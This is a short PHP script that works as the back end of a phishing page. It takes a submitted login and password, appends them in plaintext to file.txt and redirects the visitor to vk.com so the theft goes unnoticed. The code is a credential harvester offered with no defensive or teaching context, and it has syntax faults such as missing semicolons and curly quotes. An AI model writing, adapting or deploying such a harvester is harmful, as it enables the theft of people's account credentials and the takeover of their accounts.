 <?
$login = $_POST['login']
$pass = $_POST['password']

 
$f = fopen('file.txt', a);
fputs($f, $login."|".$pass);
fclose($f);
echo "<html><head><META HTTP-EQUIV=’Refresh’ content =’0; URL=http://vk.com’></head></html>";
?>





















